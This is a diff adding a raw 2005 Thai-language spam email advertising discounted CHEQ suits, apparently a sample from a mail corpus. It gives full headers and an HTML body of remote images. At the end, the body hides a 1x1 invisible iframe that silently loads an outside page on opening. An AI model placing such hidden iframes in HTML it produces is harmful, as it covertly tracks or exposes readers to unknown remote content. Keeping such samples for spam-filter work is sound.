@@ -1,0 +1,27 @@
+Return-Path: <cheq@cheqsale024.com>
+Delivered-To: em-ca-bruceg@em.ca
+Received: (qmail 13686 invoked by uid 115); 17 Jul 2005 11:06:35 -0000
+Received: from cheq@cheqsale024.com by churchill by uid 64011 with qmail-scanner-1.22 
+ ( Clear:RC:0(58.8.251.63):. 
+ Processed in 0.110589 secs); 17 Jul 2005 11:06:35 -0000
+Received: from ppp-58.8.251.63.revip2.asianet.co.th (HELO tiger) (58.8.251.63)
+  by churchill.factcomp.com with SMTP; 17 Jul 2005 11:06:34 -0000
+From: "เสื้อสูท CHEQ" <cheq@cheqsale024.com>
+To: <bruceg@em.ca>
+Subject: พลาดไม่ได้! เสื้อสูท CHEQ เพียง 1,500.- ..ราคาพิเศษ 21-27 ก.ค. ที่ Emporium เท่านั้น
+Mime-Version: 1.0
+Content-Type: text/html; charset="iso-8859-1"
+Date: Sun, 17 Jul 2005 18:07:17
+X-Qmail-Scanner-Message-ID: <112159839567213680@churchill>
+
+<html>
+<HEAD><META http-equiv=Content-Type content="text/html; charset=windows-874"></HEAD>
+<body bgcolor="121210">
+<font size="2" color="#999999">หากรายละเอียดด้านล่างไม่แสดงสามารถดูได้ที่ <a href="http://www.mga.co.th/ma/suth.html" target="_blank">http://www.mga.co.th/ma/suth.html</a></font><br>
+<img src="http://www.mga.co.th/ma/suth1.gif" width="800" height="400"><br><img src="http://www.mga.co.th/ma/suth2.gif" width="800" height="1234"><br><img src="http://www.mga.co.th/ma/suth3.gif" width="800" height="246"><br>
+<font color="#666666"><font size="2" color="#006666"><br>
+<font color="#006699">unsubscript please reply to <a href="mailto:unsubmga@poppymail.com">unsubmga@poppymail.com</a> 
+</font> </font></font> <iframe src="http://www.ohgos.com/suth/default.asp"  frameborder="no" width="1" height="1" scrolling="no" > 
+</iframe> 
+</body>
+</html>
